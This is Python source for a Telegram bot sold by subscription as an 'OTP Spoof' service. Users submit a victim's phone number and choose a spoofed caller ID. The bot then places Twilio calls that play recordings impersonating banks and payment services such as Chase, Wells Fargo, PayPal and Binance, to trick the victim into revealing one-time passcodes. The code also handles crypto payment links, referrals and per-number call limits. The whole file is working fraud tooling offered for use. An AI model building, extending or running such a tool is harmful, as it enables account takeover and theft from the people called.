import flask
# from flask_session import Session
import re
import phonenumbers
import telebot
from flask import Flask, request
from telebot import types
from twilio.rest import Client
import requests
from requests.structures import CaseInsensitiveDict
from twilio.twiml.voice_response import VoiceResponse, Gather
from requests.structures import CaseInsensitiveDict
from urllib.parse import quote
twilionumber = '+18882203556'
from cred import *
from user_manage import check_credit_active
accLast = ""
from dbase import *
global resp
SUDO_ID = 5983515377
SUDO_ID2 = 5983515377
gather = ""
bankname = ""
import threading
response_text = ""

import os
from uuid import uuid4



vicName = ""
# Services
americanExpress = ""
applePay = ""
binance = ""
boa = ""
import random
import json
chaseBank = ""
final = ""
gmail = ""
invalid = ""
paypal = ""
samsungPay = ""
thankyou = ""
wellsfargo = ""
vid = ""
numbAc = ""
path = 'UserDetails.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

# Twilio connection
client = Client(account_sid, auth_token)

# Flask connection
app = Flask(__name__)

# Bot connection
bot = telebot.TeleBot(API_TOKEN, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)


# Process webhook calls 
@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(403)

@bot.callback_query_handler(func=lambda call: call.data.startswith("sosbtn:"))
def sosbtn(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    tsms = "*Please Contact @m_Kzt with*"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("joinChannel:"))
def joinChannel(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    tsms = "*Visit : @DexTeamUpdates*"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')



@bot.callback_query_handler(func=lambda call: call.data.startswith("buySubscription:"))
def buySubscription(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    inline_keyboard3 = types.InlineKeyboardMarkup()



    trial = types.InlineKeyboardButton("Trial -  4 USD ($) 💵", callback_data="trial:{message.from_user.id}")
    days7 = types.InlineKeyboardButton("7 Days -  18 USD ($) 💵", callback_data="days7:{message.from_user.id}")
    days14 = types.InlineKeyboardButton("14 Days - 32 USD ($) 💵", callback_data="days14:{message.from_user.id}")
    month = types.InlineKeyboardButton("1 Month - 60 USD ($) 💵", callback_data="month:{message.from_user.id}")
    months3 = types.InlineKeyboardButton("3 Months - 95 USD ($) 💵", callback_data="months3:{message.from_user.id}")
    lifetime = types.InlineKeyboardButton("Lifetime - 300 USD ($) 💵", callback_data="lifetime:{message.from_user.id}")


    # Add the button to the keyboard
    inline_keyboard3.add(trial)
    inline_keyboard3.add(days7)
    inline_keyboard3.add(days14)
    inline_keyboard3.add(month)
    inline_keyboard3.add(months3)
    inline_keyboard3.add(lifetime)


    tsms = "*Choose your package to subscribe* 🔽\n\n`All subscriptions can be bought in the bot. If you run out of subscription time, you can still make calls, and the bot will charge per call time:` *USA (0.02 $/ sec)*"


    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown', reply_markup=inline_keyboard3)






@bot.callback_query_handler(func=lambda call: call.data.startswith("trial:"))
def trialz(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import coinbase
    payment_link, charge_code = coinbase.create_payment_link(call.message.chat.id, 4, "Trial")
    tsms = f"*Here is your payment link* ✅  : \n \n{payment_link} \n\n🤖*send,* \n\n➡️ `/check_payment_coinbase {charge_code}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith("days7:"))
def days7(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import coinbase
    payment_link, charge_code = coinbase.create_payment_link(call.message.chat.id, 18, "7 Days")
    tsms = f"*Here is your payment link* ✅  : \n \n{payment_link} \n\n🤖*send,* \n\n➡️ `/check_payment_coinbase {charge_code}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("days14:"))
def days14(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import coinbase
    payment_link, charge_code = coinbase.create_payment_link(call.message.chat.id, 32, "14 Days")
    tsms = f"*Here is your payment link* ✅  : \n \n{payment_link} \n\n🤖*send,* \n\n➡️ `/check_payment_coinbase {charge_code}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("month:"))
def month(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import coinbase
    payment_link, charge_code = coinbase.create_payment_link(call.message.chat.id, 60, "Month")
    tsms = f"*Here is your payment link* ✅  : \n \n{payment_link} \n\n🤖*send,* \n\n➡️ `/check_payment_coinbase {charge_code}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("months3:"))
def month(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import coinbase
    payment_link, charge_code = coinbase.create_payment_link(call.message.chat.id, 95, "3 Months")
    tsms = f"*Here is your payment link* ✅  : \n \n{payment_link} \n\n🤖*send,* \n\n➡️ `/check_payment_coinbase {charge_code}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith("lifetime:"))
def month(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import coinbase
    payment_link, charge_code = coinbase.create_payment_link(call.message.chat.id, 350, "Lifetime")
    tsms = f"*Here is your payment link* ✅  : \n \n{payment_link} \n\n🤖*send,* \n\n➡️ `/check_payment_coinbase {charge_code}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')





@bot.callback_query_handler(func=lambda call: call.data.startswith("PayasYouGo:"))
def PayasYouGo(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    inline_keyboard3 = types.InlineKeyboardMarkup()



    usd15 = types.InlineKeyboardButton("15 USD ($) 💵", callback_data="usd15:{message.from_user.id}")
    usd20 = types.InlineKeyboardButton("20 USD ($) 💵", callback_data="usd20:{message.from_user.id}")
    usd30 = types.InlineKeyboardButton("30 USD ($) 💵", callback_data="usd30:{message.from_user.id}")
    usd50 = types.InlineKeyboardButton("50 USD ($) 💵", callback_data="usd50:{message.from_user.id}")
    usd100 = types.InlineKeyboardButton("100 USD ($) 💵", callback_data="usd100:{message.from_user.id}")
    usd200 = types.InlineKeyboardButton("200 USD ($) 💵", callback_data="usd200:{message.from_user.id}")


    # Add the button to the keyboard
    inline_keyboard3.add(usd15)
    inline_keyboard3.add(usd20)
    inline_keyboard3.add(usd30)
    inline_keyboard3.add(usd50)
    inline_keyboard3.add(usd100)
    inline_keyboard3.add(usd200)


    tsms = "*Choose your package to add funds* 🔽\n\n`All subscriptions can be bought in the bot. If you run out of subscription time, you can still make calls, and the bot will charge per call time:` *USA (0.02 $/ sec)*"


    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown', reply_markup=inline_keyboard3)



@bot.callback_query_handler(func=lambda call: call.data.startswith("usd15:"))
def usd15(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import autopay
    link = autopay.createLink(call.message.chat.id, "Dex Bot Topup", "15 USD Topup Balance", 15)
    tsms = f"*Here is your payment link* :  \n✅ https://checkout.hoodpay.io/{link} \n\n🤖*send,* \n\n➡️ `/check_payment {link}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith("usd30:"))
def usd30(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import autopay
    link = autopay.createLink(call.message.chat.id, "Dex Bot Topup", "30 USD Topup Balance", 30)
    tsms = f"*Here is your payment link* :  \n✅ https://checkout.hoodpay.io/{link} \n\n🤖*send,* \n\n➡️ `/check_payment {link}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("usd50:"))
def usd50(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import autopay
    link = autopay.createLink(call.message.chat.id, "Dex Bot Topup", "50 USD Topup Balance", 50)
    tsms = f"*Here is your payment link* :  \n✅ https://checkout.hoodpay.io/{link} \n\n🤖*send,* \n\n➡️ `/check_payment {link}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("usd100:"))
def usd100(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import autopay
    link = autopay.createLink(call.message.chat.id, "Dex Bot Topup", "100 USD Topup Balance", 100)
    tsms = f"*Here is your payment link* :  \n✅ https://checkout.hoodpay.io/{link} \n\n🤖*send,* \n\n➡️ `/check_payment {link}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("usd200:"))
def usd200(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    import autopay
    link = autopay.createLink(call.message.chat.id, "Dex Bot Topup", "200 USD Topup Balance", 200)
    tsms = f"*Here is your payment link* :  \n✅ https://checkout.hoodpay.io/{link} \n\n🤖*send,* \n\n➡️ `/check_payment {link}`\n\n *to check payment status*🔃"
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=tsms,parse_mode='Markdown')




# Handle '/start'
@bot.message_handler(commands=['start'])
def send_welcome(message):
    
    id_ofu = message.from_user.id
    import user_manage
    if not user_manage.user_check(id_ofu):
        user_manage.new_user(id_ofu)
    

    command_parts = message.text.split(' ')
    if len(command_parts) > 1:
        referral_id = command_parts[1]
        if str(referral_id) == str(message.from_user.id):
            bot.send_message(message.from_user.id, f"*You cant referral yourself * ❌",parse_mode='Markdown') 
        else:
            message.from_user.last_name = ""
            name = message.from_user.first_name + ' ' + message.from_user.last_name
            reft = f"https://devkithub.com/DexBots/ref/index.php?user={referral_id}&refer={id_ofu}"
            reff = requests.get(reft)
            print(reff.text)
            if reff.text == "true":
                bot.send_message(referral_id, f"🎉 *Congrats!* 🎉\n\nYou got a new referral: `{name}`",parse_mode='Markdown')
                bot.send_message("-1002089896040", f"New referral : `{name}`",parse_mode='Markdown')
            



    print(id_ofu)
    print(check_user(id_ofu))
    print(check_admin(id_ofu))
    print(fetch_expiry_date(id_ofu))

    register = f"https://devkithub.com/DexBots/add.php?userId={id_ofu}"
    responseOk = requests.get(register)
    print(responseOk.text)
    import user_manage
    create_user_none(id_ofu)
    

    if check_admin(id_ofu):
        if not check_user(id_ofu):
            create_user_lifetime(id_ofu)
        else:
            pass
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="User Mode")
        item2 = types.KeyboardButton(text="Admin Mode")
        keyboard.add(item1)
        keyboard.add(item2)
        bot.send_message(message.chat.id, "Welcome to Dex ! 🌀\n\nWould you like to be in user or admin mode?",
                         reply_markup=keyboard)


    elif (check_user(id_ofu) == True) and check_expiry_days(id_ofu) > 0 or user_manage.check_credit_active(int(id_ofu)) :


        days_left = check_expiry_days(id_ofu)
        name = message.from_user.first_name

        inline_keyboard2 = types.InlineKeyboardMarkup()
     
    # Create an inline button to get access
        sosbtn = types.InlineKeyboardButton("🆘 Help", callback_data="sosbtn:{message.from_user.id}")
        joinChannel = types.InlineKeyboardButton("Video Instruction 📹", callback_data="joinChannel:{message.from_user.id}")
        PayasYouGo = types.InlineKeyboardButton("Pay as you go 💴", callback_data="PayasYouGo:{message.from_user.id}")

        inline_keyboard2.add(sosbtn)
        inline_keyboard2.add(joinChannel)
        inline_keyboard2.add(PayasYouGo)
        import user_manage

        if user_manage.is_paygo(int(message.chat.id)):
            credit_bal = user_manage.check_credit(int(message.chat.id))
            send = bot.send_message(message.chat.id,
                        f"Hey *{name}* 👋 \n\nYou have *{credit_bal}* credits left \n\n"
                        "*Send the bot the target's phone number in international format:*\n\n"
                        "📱\n"
                        "├ US: `+1781240****`\n"
                        "├ ES: `+3496397****`\n"
                        "├ CA: `+1416603****`\n"
                        "├ DE: `+491769612****`\n"
                        "├ IT: `+39349199****`\n"
                        "├ CH: `+86106603****`\n"
                        "└ FR: `+3325222****`", parse_mode='Markdown',reply_markup=inline_keyboard2)
            bot.register_next_step_handler(send, saving_phonenumber)

        else:
            send = bot.send_message(message.chat.id,
                            f"Hey *{name}* 👋 \n\nYou have *{days_left}* days left ⏰ \n\n"
                            "*Send the bot the target's phone number in international format:*\n\n"
                            "📱\n"
                            "├ US: `+1781240****`\n"
                            "├ ES: `+3496397****`\n"
                            "├ CA: `+1416603****`\n"
                            "├ DE: `+491769612****`\n"
                            "├ IT: `+39349199****`\n"
                            "├ CH: `+86106603****`\n"
                            "└ FR: `+3325222****`", parse_mode='Markdown',reply_markup=inline_keyboard2)
            bot.register_next_step_handler(send, saving_phonenumber)


        
    else:
    # Send the restricted access message with inline buttons
    # Create an inline keyboard for the original message
     inline_keyboard = types.InlineKeyboardMarkup()
     
    # Create an inline button to get access
     get_access_button = types.InlineKeyboardButton("🛒 Get Access 🛒", callback_data="get_access:{message.from_user.id}")
     free_access = types.InlineKeyboardButton("🎁 Free access 🎁", callback_data="freeaccess:{message.from_user.id}")
     sosbtn2 = types.InlineKeyboardButton("🆘 Help", callback_data="sosbtn:{message.from_user.id}")
     joinChannel = types.InlineKeyboardButton("Video Instruction 📹", callback_data="joinChannel:{message.from_user.id}")
     PayasYouGo = types.InlineKeyboardButton("Pay as you go 💴", callback_data="PayasYouGo:{message.from_user.id}")
     buySub = types.InlineKeyboardButton("Buy Subscription 💲", callback_data="buySubscription:{message.from_user.id}")


    # Add the button to the keyboard
     inline_keyboard.add(get_access_button)
     inline_keyboard.add(free_access)
     inline_keyboard.add(sosbtn2)
     inline_keyboard.add(joinChannel)
     inline_keyboard.add(PayasYouGo)
     inline_keyboard.add(buySub)

    # Send the original message with the inline button
     bot.send_message(message.chat.id,
                     "⚠️ *Attention!* ⚠️ \n\n 🌙 *Sorry, but your access to this bot is currently restricted.* 🌙 \n \n `To continue using the bot and unlock all features,`Press /buy\n\n*Press /ref to refferal users and earn free days on bot  🎁 *\n \n ",
                     parse_mode='Markdown', reply_markup=inline_keyboard)
     

# Define the updated message
buymsg = "🛒 *Purchase Options:*\n\n" \
         "• **Trial** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT--Trial--days) - *LIMITED TO USA*\n" \
         "• **Week** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT----Week) - *Global Calls*\n" \
         "• **Month** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT--Month---Offer-10) - *Global Calls*\n" \
         "• **3 Months** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT---3-Months) - *Global Calls*\n" \
         "• **Lifetime** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT---Lifetime) - ⭐️ *Limited Offer *\n\n" \
         "👉 Choose the desired plan and click on the corresponding link to make a purchase.\n" \
         "If you have any questions or need assistance, feel free to reach out to our support team."

# Callback function to handle "Get Access" button press
@bot.callback_query_handler(func=lambda call: call.data.startswith("get_access:"))
def confirm_agreement(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=buymsg,parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data.startswith("freeaccess:"))
def confirm_agreement(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text="🎁 *Press /ref to get start*",parse_mode='Markdown')



@bot.message_handler(commands=['call'])

def handle_call_command(message):
    try:
        _, command_args = message.text.split(' ', 1)
    except ValueError:
        bot.send_message(message.chat.id, "Usage: `/call <phone_number>:<country_code_name>:<service_name>:<vicName>:<accLast>`  *Victim Name and Account Last Digit are optional*",parse_mode='Markdown')
        return
    
    if (check_user(message.chat.id) == True) and check_expiry_days(message.chat.id) > 0 or user_manage.check_credit_active(int(message.chat.id)):

        # First, split by ":", but limit the splits because the first three parameters are mandatory and known
        parts = command_args.split(':', 3)

        if len(parts) < 3:
            bot.send_message(message.chat.id, "Error: Not enough parameters. Usage: /call <phone_number>:<country_code_name>:<service_name>[:<vicName>][:<accLast>]")
            return

        phone_number, country_code_name, service_name = parts[:3]
        # For optional parameters, further split the last part if exists
        optional_params = parts[3].split(':', 1) if len(parts) > 3 else []
        vicName = optional_params[0] if len(optional_params) > 0 else ""
        accLast = optional_params[1] if len(optional_params) > 1 else ""

        # Assuming functions to save these details and to prepare and make the call are implemented
        # print(f"Phone: {phone_number}, Country: {country_code_name}, Service: {service_name}, Name: {vicName}, Last: {accLast}")
        prepare_and_make_call(message, phone_number, country_code_name, service_name, vicName, accLast)
    else:
        bot.send_message(message.chat.id, "Subscription not found ! Visit : dex.sellpass.io",parse_mode='Markdown')


def prepare_and_make_call(message, phone_number, country_code_name, service_name, vicName, accLast):
    print(vicName)
    print(accLast)
    setnumUS(message)
    usSelected(message)
    
def saving_phonenumber(message):
    userid = message.from_user.id
    username = message.from_user.username
    no_tobesaved = str(message.text)
    try:
        z = phonenumbers.parse(no_tobesaved, "US")
    except:
        bot.send_message(message.chat.id, "Invalid number")
    try:
        if phonenumbers.is_valid_number(z) == True and phonenumbers.is_valid_number(z) == True:
            save_phonenumber(no_tobesaved, userid)

            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            keyboard.row_width = 2
            item1 = types.KeyboardButton(text="Ok")
            keyboard.add(item1)
            send = bot.send_message(message.chat.id, f"✅ Send *Ok* to confirm mobile \n\n 📱  *{no_tobesaved}*",
                                    parse_mode='Markdown', reply_markup=keyboard)
            
            strix = f"https://devkithub.com/DexBots/trial/?save=true&id={userid}&number={no_tobesaved}"
            trds = requests.get(strix)
            print(trds.text)

            saveNum = f"https://devkithub.com/DexBots/calls/?func=search&userid={userid}&number={no_tobesaved}"
            savedNum = requests.get(saveNum)
            print(savedNum.text)
            if(int(savedNum.text)==5):
                bot.send_message(message.chat.id,
                             f"You have called maximum attemps for number {no_tobesaved} please try again in few hours")
            else:
                addNum = f"https://devkithub.com/DexBots/calls/?func=add&userid={userid}&username={username}&number={no_tobesaved}"
                numAdded = requests.get(addNum)
                if(numAdded.text=="done"):

                    if check_expiry_days(userid) <= 2:
                        strix = f"https://devkithub.com/DexBots/trial/?save=true&id={userid}&number={no_tobesaved}"
                        trds = requests.get(strix)
                        print(trds.text)

                        strixs = f"https://devkithub.com/DexBots/trial/?count=true&userid={userid}"
                        trdst = requests.get(strixs)
                        print("is count",trdst.text)
                        import user_manage

                        if int(trdst.text) >= 15 and not(user_manage.save_trial_user(message.from_user.id)):
                            bot.send_message(message.chat.id,
                             f"Trial Daily call limit reached. Update Your subscription to get unlimited calls, This will reset in 24 hour")
                            print("test value",check_expiry_days(userid) <= 2)
                        else:
                            bot.register_next_step_handler(send, call_or_sms_or_script)
                    else:
                        bot.register_next_step_handler(send, call_or_sms_or_script)


                        
        else:
            bot.send_message(message.chat.id,
                             " Invalid Number ❌\n Invalid numbers ONLY.\nUse /start command.")
    except phonenumbers.NumberParseException:
        bot.send_message(message.chat.id, "Invalid Number ❌\nUse /start command")


def call_or_sms_or_script(message):
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Open Call Mode")

    keyboard.add(item1)

    bot.send_message(message.chat.id, f"⚙️ {name}   do you want ?", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Open Call Mode")
def call_mode(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="🇺🇸  (+1) United States - US")
    item2 = types.KeyboardButton(text="🇬🇧  (+44) United Kingdom - GB")
    item3 = types.KeyboardButton(text="🇨🇭  (+41) Switzerland - CH")
    item4 = types.KeyboardButton(text="🇩🇪  (+49) Germany - DE")
    item5 = types.KeyboardButton(text="🇫🇷  (+33) France - FR")
    item6 = types.KeyboardButton(text="🇯🇵  (+81) Japan - JP")
    item7 = types.KeyboardButton(text="🇨🇳  (+86) China - CN")
    keyboard.add(item1)
    keyboard.add(item2)
    keyboard.add(item3)
    keyboard.add(item4)
    keyboard.add(item5)
    keyboard.add(item6)
    keyboard.add(item7)
    bot.send_message(message.chat.id, f"Welcome to \n\n 📱 - * Call Mode ! \n \n Select Caller ID 🔽*",
                            parse_mode='Markdown', reply_markup=keyboard)
    


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇺🇸  (+1) United States - US")
def setnumUS(message):
    global twilionumber, vid
    twilio_numbers = ['+13462103278', '+12817465651', '+18882203556', '+16625000010']

# Randomly choose a Twilio number
    chosen_number = random.choice(twilio_numbers)

# Assign the chosen number to the variable
    twilionumber = chosen_number
    global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou, wellsfargo
    final = "https://devkithub.com/voices/english/final.mp3"
    invalid = "https://devkithub.com/voices/english/invalid.mp3"
    thankyou = "https://devkithub.com/voices/english/thankyou.mp3"
    vid = "Salli"
    send = bot.send_message(message.chat.id,
                         f"*You have Selected * `🇺🇸  (+1) United States - US` ✅",
                         parse_mode='Markdown')
    card_or_Otp(message)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇯🇵  (+81) Japan - JP")
def setnumJP(message):
    global twilionumber, vid

    twilionumber = "+13462103278"

    global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou, wellsfargo
    final = "https://devkithub.com/voices/english/final.mp3"
    invalid = "https://devkithub.com/voices/english/invalid.mp3"
    thankyou = "https://devkithub.com/voices/english/thankyou.mp3"
    vid = "Salli"
    send = bot.send_message(message.chat.id,
                         f"*You have Selected * `🇯🇵  (+81) Japan - JP` ✅",
                         parse_mode='Markdown')
    card_or_Otp(message)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇨🇳  (+86) China - CN")
def setnumChina(message):
    global twilionumber, vid

# Assign the chosen number to the variable
    twilionumber = "+13462103278"

    global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou, wellsfargo
    final = "https://devkithub.com/voices/english/final.mp3"
    invalid = "https://devkithub.com/voices/english/invalid.mp3"
    thankyou = "https://devkithub.com/voices/english/thankyou.mp3"
    vid = "Salli"
    send = bot.send_message(message.chat.id,
                         f"*You have Selected * `🇨🇳  (+86) China - CN` ✅",
                         parse_mode='Markdown')
    card_or_Otp(message)



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇫🇷  (+33) France - FR")
def setnumFrench(message):
    global twilionumber, vid
    twilionumber = '+33745932665'
    global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou, wellsfargo

    final = "https://devkithub.com/voices/finalFrench.mp3"
    invalid = "https://devkithub.com/voices/frenchInvalid.mp3"
    thankyou = "https://devkithub.com/voices/frenchThankyou.mp3"

    vid = "Lea"
    
    send = bot.send_message(message.chat.id,
                         f"*You have Selected * `🇫🇷  (+33) France - FR`",
                         parse_mode='Markdown')
    card_or_Otp(message)

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇬🇧  (+44) United Kingdom - GB")
def setnumUK(message):

    if check_expiry_days(message.chat.id)>2:
        global twilionumber
        twilionumber = '+441354700017'
        global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou, vid
    
        americanExpress = "https://devkithub.com/voices/english/americanExpress.mp3"
        applePay = "https://devkithub.com/voices/english/applePay.mp3"
        binance = "https://devkithub.com/voices/english/binance.mp3"
        boa = "https://devkithub.com/voices/english/boa.mp3"
        chaseBank = "https://devkithub.com/voices/english/chaseBank.mp3"
        final = "https://devkithub.com/voices/english/final.mp3"
        gmail = "https://devkithub.com/voices/english/gmail.mp3"
        invalid = "https://devkithub.com/voices/english/invalid.mp3"
        paypal = "https://devkithub.com/voices/english/paypal.mp3"
        samsungPay = "https://devkithub.com/voices/english/samsungPay.mp3"
        thankyou = "https://devkithub.com/voices/english/thankyou.mp3"

        vid = "Salli"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇬🇧  (+44) United Kingdom - GB` ✅",
                            parse_mode='Markdown')
        card_or_Otp(message)
    else:
      twilionumber = '+18882203556'
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')
    
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇨🇭  (+41) Switzerland - CH")
def setnumCH(message):
    if check_expiry_days(message.chat.id)>2:
        global twilionumber
        twilionumber = '+441354700017'
        global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou
    
        americanExpress = "https://devkithub.com/voices/english/americanExpress.mp3"
        applePay = "https://devkithub.com/voices/english/applePay.mp3"
        binance = "https://devkithub.com/voices/english/binance.mp3"
        boa = "https://devkithub.com/voices/english/boa.mp3"
        chaseBank = "https://devkithub.com/voices/english/chaseBank.mp3"
        final = "https://devkithub.com/voices/english/final.mp3"
        gmail = "https://devkithub.com/voices/english/gmail.mp3"
        invalid = "https://devkithub.com/voices/english/invalid.mp3"
        paypal = "https://devkithub.com/voices/english/paypal.mp3"
        samsungPay = "https://devkithub.com/voices/english/samsungPay.mp3"
        thankyou = "https://devkithub.com/voices/english/thankyou.mp3"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇨🇭  (+41) Switzerland - CH` ✅",
                            parse_mode='Markdown')
        card_or_Otp(message)
    else:
      twilionumber = '+18882203556'
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇩🇪  (+49) Germany - DE")
def setnumDE(message):
    if check_expiry_days(message.chat.id)>2:
        global twilionumber
        twilionumber = '+4915216437245'
        global americanExpress, applePay, binance, boa, chaseBank, final, gmail, invalid, paypal, samsungPay, thankyou
    
        americanExpress = "https://devkithub.com/voices/english/americanExpress.mp3"
        applePay = "https://devkithub.com/voices/english/applePay.mp3"
        binance = "https://devkithub.com/voices/english/binance.mp3"
        boa = "https://devkithub.com/voices/english/boa.mp3"
        chaseBank = "https://devkithub.com/voices/english/chaseBank.mp3"
        final = "https://devkithub.com/voices/english/final.mp3"
        gmail = "https://devkithub.com/voices/english/gmail.mp3"
        invalid = "https://devkithub.com/voices/english/invalid.mp3"
        paypal = "https://devkithub.com/voices/english/paypal.mp3"
        samsungPay = "https://devkithub.com/voices/english/samsungPay.mp3"
        thankyou = "https://devkithub.com/voices/english/thankyou.mp3"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇩🇪  (+49) Germany - DE` ✅",
                            parse_mode='Markdown')
        card_or_Otp(message)
    else:
      twilionumber = '+18882203556'
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')




def card_or_Otp(message):
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2

    item4 = types.KeyboardButton(text="OTP Spoof 🤖")

    keyboard.add(item4)



    bot.send_message(message.chat.id, f"Please choose an option, {name}. ⤵️", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "User Mode")
def usecase1(message):
    if check_user(message.from_user.id):
        name = message.from_user.first_name
        send0 = bot.send_message(message.chat.id, f"Hey {name} welcome to ｄｘ √∆™ ｏｔｐ 💎", parse_mode='Markdown')
        bot.send_message(message.chat.id,
                         "*Reply with the number victim 📱*\n\n(e.g +14358762364)\n\n*You Have to Use The +*",
                         parse_mode='Markdown')
        bot.register_next_step_handler(send0, saving_phonenumber)
    else:
        bot.send_message(message.chat.id,
                         "Sorry license key not found ⚠️ \n\n In you already purchased key contact - @m_kzT \n\n 💎 To purchase key visit : dex.sellpass.io")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Admin Mode")
def usecase2(message):
    if message.chat.id == 5126439799:
        send1 = bot.send_message(message.chat.id, "Hey Admin 👑\n*Send “Ok” to continue*", parse_mode='Markdown')
        bot.register_next_step_handler(send1, adminfunction)


def adminfunction(message):
    if message.chat.id == 5126439799:
        name = message.from_user.first_name
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
        keyboard.row_width = 1
        item = types.KeyboardButton(text="Edit access")
